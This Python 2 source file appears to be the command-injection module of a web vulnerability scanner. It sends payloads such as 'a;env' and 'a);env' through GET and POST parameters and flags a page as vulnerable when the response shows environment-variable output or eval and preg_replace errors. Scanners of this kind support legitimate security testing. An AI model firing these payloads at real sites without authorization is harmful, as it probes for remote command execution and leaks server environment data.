from attack import Attack
from vulnerability import Vulnerability

class ExecAttack(Attack):

  payloads=["a;env",
            "a);env",
            "/e\0"]

  def __init__(self,HTTP,xmlRepGenerator,):
    Attack.__init__(self,HTTP,xmlRepGenerator)

  def __findPatternInResponse(self,data,cmd,warn):
    err = ""
    if data.find("eval()'d code</b> on line <b>")>=0 and warn==0:
      err="Warning eval()"
      warn=1
    if data.find("PATH=")>=0 and data.find("PWD=")>=0:
      err="Command execution"
      cmd=1
    if data.find("Cannot execute a blank command in")>=0 and warn==0:
      err="Warning exec"
      warn=1
    if data.find("Fatal error</b>:  preg_replace")>=0 and warn==0:
      err="preg_replace injection"
      warn=1
    return err,cmd,warn

  def attackGET(self,page,dict,attackedGET):
    if dict=={}:
      warn=0
      cmd=0
      err500=0
      for payload in self.payloads:
        err=""
        url=page+"?"+self.HTTP.quote(payload)
        if url not in attackedGET:
          if self.verbose==2:
            print "+ "+url
          attackedGET.append(url)
          if cmd==1: continue
          data,code=self.HTTP.send(url).getPageCode()
          err,cmd,warn = self.__findPatternInResponse(data,cmd,warn)
          if err!="":
            self.reportGen.logVulnerability(Vulnerability.EXEC,
                                            Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                            url,self.HTTP.quote(payload),err+" (QUERY_STRING)")
            print err,"(QUERY_STRING) in",page
            print "\tEvil url:",url
          else:
            if code==500 and err500==0:
              err500=1
              self.reportGen.logVulnerability(Vulnerability.EXEC,
                                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                              url,self.HTTP.quote(payload),"500 HTTP Error code")
              print "500 HTTP Error code with"
              print "\tEvil url:",url
    for k in dict.keys():
      warn=0
      cmd=0
      err500=0
      for payload in self.payloads:
        err=""
        tmp=dict.copy()
        tmp[k]=payload
        url=page+"?"+self.HTTP.encode(tmp)
        if url not in attackedGET:
          if self.verbose==2:
            print "+ "+url
          attackedGET.append(url)
          if cmd==1: continue
          data,code=self.HTTP.send(url).getPageCode()
          err,cmd,warn = self.__findPatternInResponse(data,cmd,warn)
          if err!="":
            if self.color==0:
              self.reportGen.logVulnerability(Vulnerability.EXEC,
                                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                              url,self.HTTP.encode(tmp),err+" ("+k+")")
              print err,"("+k+") in",page
              print "\tEvil url:",url
            else:
              self.reportGen.logVulnerability(Vulnerability.EXEC,Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                url,self.HTTP.encode(tmp),
                                err+" : "+url.replace(k+"=","\033[0;31m"+k+"\033[0;0m="))
              print err,":",url.replace(k+"=","\033[0;31m"+k+"\033[0;0m=")
          else:
            if code==500 and err500==0:
              err500=1
              self.reportGen.logVulnerability(Vulnerability.EXEC,
                                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                              url,self.HTTP.encode(tmp),
                                              "500 HTTP Error code")
              print "500 HTTP Error code with"
              print "\tEvil url:",url

  def attackPOST(self,form,attackedPOST):
    page=form[0]
    dict=form[1]
    err=""
    for payload in self.payloads:
      warn=0
      cmd=0
      err500=0
      for k in dict.keys():
        tmp=dict.copy()
        tmp[k]=payload
        if (page,tmp) not in attackedPOST:
          attackedPOST.append((page,tmp))
          if cmd==1: continue
          headers={"Accept": "text/plain"}
          if self.verbose==2:
            print "+ "+page
            print "  ",tmp
          data,code=self.HTTP.send(page,self.HTTP.encode(tmp),headers).getPageCode()
          err,cmd,warn = self.__findPatternInResponse(data,cmd,warn)
          if err!="":
            self.reportGen.logVulnerability(Vulnerability.EXEC,
                                            Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                            page,self.HTTP.encode(tmp),
                                            err+" coming from "+form[2])
            print err,"in",page
            print "  with params =",self.HTTP.encode(tmp)
            print "  coming from",form[2]
          else:
            if code==500 and err500==0:
              err500=1
              self.reportGen.logVulnerability(Vulnerability.EXEC,
                                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                              page,self.HTTP.encode(tmp),
                                              "500 HTTP Error code coming from "+form[2])
              print "500 HTTP Error code in",page
              print "  with params =",self.HTTP.encode(tmp)
              print "  coming from",form[2]

